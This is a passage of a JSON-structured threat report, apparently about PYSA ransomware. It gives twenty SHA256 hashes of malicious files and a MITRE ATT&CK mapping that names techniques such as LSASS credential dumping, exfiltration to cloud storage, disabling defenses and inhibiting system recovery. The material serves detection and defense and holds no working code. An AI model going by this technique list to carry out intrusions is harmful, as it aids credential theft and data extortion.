                    "html": "<p>SHA256\ne9662b468135f758a9487a1be50159ef57f3050b753de2915763b4ed78839ead\n44f1def68aef34687bfacf3668e56873f9d603fc6741d5da1209cc55bdc6f1f9\n0433efd9ba06378eb6eae864c85aafc8b6de79ef6512345294e9e379cc054c3d\n164cb8e82d7e07cca0409925cadd8be5e3e8e07db88526ff7fe87596c6a6bd07\n7c774062bc55e2d0e869d5d69820aa6e3b759454dbc926475b4db6f7f2b6cb14\n58ebe9b1c926c87dc1e9d924942504a56456007bff8de4932ef18e476da700c2\n6f3cd5f05ab4f404c78bab92f705c91d967b31a9b06017d910af312fa87ae3d6\n1e39243c218056dbe72b6b889f2245b3d0f49f29952950d4b83581263c09c1ae\nfb31b023d2545563862c9c314d91770fcec7bb7a4b13abfdb5244266a67446a3\n153222163442b304f5cee295268115c9cfdf0f1168f49f9e3fae52340eee51ec\nd1b6ee9b716fe48e51ac4e6bec691366bb08d507773d61a5d14fb15ec5e25e2b\n6f4338a7a3ef8e491279ae81543a08554cad15d1bce6007047bc4449d945b799\n051fb654403340420102430f807ea41ab790666488d897dc5b0008e99fed47d6\n75c8e93ffcfd84f0d3444c0b9fc8c9a462f91540c8760025c393a749d198d9db\n7fd3000a3afbf077589c300f90b59864ec1fb716feba8e288ed87291c8fdf7c3\n931772ac59f5859e053589202c8db81edc01911391fe5b32c9abb5bbc2b06e43\naf99b482eb0b3ff976fa719bf0079da15f62a6c203911655ed93e52ae05c4ac8\n90cf35560032c380ddaaa05d9ed6baacbc7526a94a992a07fd02f92f371a8e92\n4770a0447ebc83a36e590da8d01ff4a418d58221c1f44d21f433aaf18fad5a99\ne4287e9708a73ce6a9b7a3e7c72462b01f7cc3c595d972cf2984185ac1a3a4a8</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x8624a72d>",
            "title": "MITRE ATT&CK",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x644cf033>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x932b9543>": "https://attack.mitre.org/techniques/T1027/002/",
                        "<a_0x135b94bf>": "https://attack.mitre.org/techniques/T1007/",
                        "<a_0x702a98b0>": "https://attack.mitre.org/techniques/T1059/",
                        "<a_0x82d10ec7>": "https://attack.mitre.org/tactics/TA0010/",
                        "<a_0xe196d2a>": "https://attack.mitre.org/techniques/T1082/",
                        "<a_0x21dfd9ae>": "https://attack.mitre.org/techniques/T1490/",
                        "<a_0x8bb8274a>": "https://attack.mitre.org/techniques/T1048/003/",
                        "<a_0x6f358c13>": "https://attack.mitre.org/techniques/T1567/002/",
                        "<a_0xace2ab6e>": "https://attack.mitre.org/software/S0583/",
                        "<a_0xb228959c>": "https://attack.mitre.org/software/S0154/",
                        "<a_0xbe21667>": "https://attack.mitre.org/techniques/T1110",
                        "<a_0x2af684f6>": "https://attack.mitre.org/techniques/T1562",
                        "<a_0x49c74253>": "https://attack.mitre.org/techniques/T1070/004",
                        "<a_0x6d6791be>": "https://attack.mitre.org/techniques/T1036",
                        "<a_0xe8d2578d>": "https://attack.mitre.org/techniques/T1112",
                        "<a_0x970ac76d>": "https://attack.mitre.org/techniques/T1046",
                        "<a_0xb23511b6>": "https://attack.mitre.org/techniques/T1003/001",
                        "<a_0x55246399>": "https://attack.mitre.org/techniques/T1021/001",
                        "<a_0x4614cacf>": "https://attack.mitre.org/techniques/T1489",
                        "<a_0xbd574ca0>": "https://attack.mitre.org/techniques/T1016",
                        "<a_0xec729a74>": "https://attack.mitre.org/techniques/T1569/002",
                        "<a_0x744881f5>": "https://attack.mitre.org/techniques/T1552/001"
                    },
                    "text": "T1027.002 Obfuscated Files or Information: Software Packing<crlf>T1007 System Service Discovery<crlf>T1059 Command and Scripting Interpreter<crlf>TA0010 Exfiltration<crlf>T1082 System Information Discovery<crlf>T1490 Inhibit System Recovery<crlf>T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol<crlf>T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage<crlf>S0583 PYSA<crlf>S0154 Cobalt Strike<crlf>T1110 Brute Force<crlf>T1562 Impair Defenses: Disable or Modify Tools<crlf>T1070.004 Indicator Removal on Host: File Deletion<crlf>T1036 Masquerading: Match Legitimate Name or Location<crlf>T1112 Modify Registry<crlf>T1046 Network Service Scanning<crlf>T1003.001 OS Credential Dumping: LSASS Memory<crlf>T1021.001 Remote Service: Remote Desktop Protocol<crlf>T1489 Service Stop<crlf>T1016 System Network Configuration Discovery<crlf>T1569.002 System Services: Service Execution<crlf>T1552.001 Unsecured Credentials: Credentials in Files",
                    "html": "<p><a href=\"https://attack.mitre.org/techniques/T1027/002/\" rel=\"noopener noreferrer\" target=\"_blank\">T1027.002</a> \u2013 Obfuscated Files or Information: Software Packing\n<a href=\"https://attack.mitre.org/techniques/T1007/\" rel=\"noopener noreferrer\" target=\"_blank\">T1007</a> \u2013 System Service Discovery\n<a href=\"https://attack.mitre.org/techniques/T1059/\" rel=\"noopener noreferrer\" target=\"_blank\">T1059 </a>\u2013 Command and Scripting Interpreter\n<a href=\"https://attack.mitre.org/tactics/TA0010/\" rel=\"noopener noreferrer\" target=\"_blank\">TA0010</a> \u2013 Exfiltration\n<a href=\"https://attack.mitre.org/techniques/T1082/\" rel=\"noopener noreferrer\" target=\"_blank\">T1082</a> \u2013 System Information Discovery\n<a href=\"https://attack.mitre.org/techniques/T1490/\" rel=\"noopener noreferrer\" target=\"_blank\">T1490</a> \u2013 Inhibit System Recovery\n<a href=\"https://attack.mitre.org/techniques/T1048/003/\" rel=\"noopener noreferrer\" target=\"_blank\">T1048.003</a> \u2013 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol\n<a href=\"https://attack.mitre.org/techniques/T1567/002/\" rel=\"noopener noreferrer\" target=\"_blank\">T1567.002</a> \u2013 Exfiltration Over Web Service: Exfiltration to Cloud Storage\n<a href=\"https://attack.mitre.org/software/S0583/\" rel=\"noopener noreferrer\" target=\"_blank\">S0583</a> \u2013 PYSA\n<a href=\"https://attack.mitre.org/software/S0154/\" rel=\"noopener noreferrer\" target=\"_blank\">S0154</a> \u2013 Cobalt Strike\n<a href=\"https://attack.mitre.org/techniques/T1110\" rel=\"noopener noreferrer\" target=\"_blank\">T1110</a> \u2013 Brute Force\n<a href=\"https://attack.mitre.org/techniques/T1562\" rel=\"noopener noreferrer\" target=\"_blank\">T1562</a> \u2013 Impair Defenses: Disable or Modify Tools\n<a href=\"https://attack.mitre.org/techniques/T1070/004\" rel=\"noopener noreferrer\" target=\"_blank\">T1070.004</a> \u2013 Indicator Removal on Host: File Deletion\n<a href=\"https://attack.mitre.org/techniques/T1036\" rel=\"noopener noreferrer\" target=\"_blank\">T1036</a> \u2013 Masquerading: Match Legitimate Name or Location\n<a href=\"https://attack.mitre.org/techniques/T1112\" rel=\"noopener noreferrer\" target=\"_blank\">T1112</a> \u2013 Modify Registry\n<a href=\"https://attack.mitre.org/techniques/T1046\" rel=\"noopener noreferrer\" target=\"_blank\">T1046</a> \u2013 Network Service Scanning\n<a href=\"https://attack.mitre.org/techniques/T1003/001\" rel=\"noopener noreferrer\" target=\"_blank\">T1003.001</a> \u2013 OS Credential Dumping: LSASS Memory\n<a href=\"https://attack.mitre.org/techniques/T1021/001\" rel=\"noopener noreferrer\" target=\"_blank\">T1021.001</a> \u2013 Remote Service: Remote Desktop Protocol\n<a href=\"https://attack.mitre.org/techniques/T1489\" rel=\"noopener noreferrer\" target=\"_blank\">T1489</a> \u2013 Service Stop\n<a href=\"https://attack.mitre.org/techniques/T1016\" rel=\"noopener noreferrer\" target=\"_blank\">T1016</a> \u2013 System Network Configuration Discovery\n<a href=\"https://attack.mitre.org/techniques/T1569/002\" rel=\"noopener noreferrer\" target=\"_blank\">T1569.002</a> \u2013 System Services: Service Execution\n<a href=\"https://attack.mitre.org/techniques/T1552/001\" rel=\"noopener noreferrer\" target=\"_blank\">T1552.001</a> \u2013 Unsecured Credentials: Credentials in Files</p>"
                }
            ]
        }
    ]
}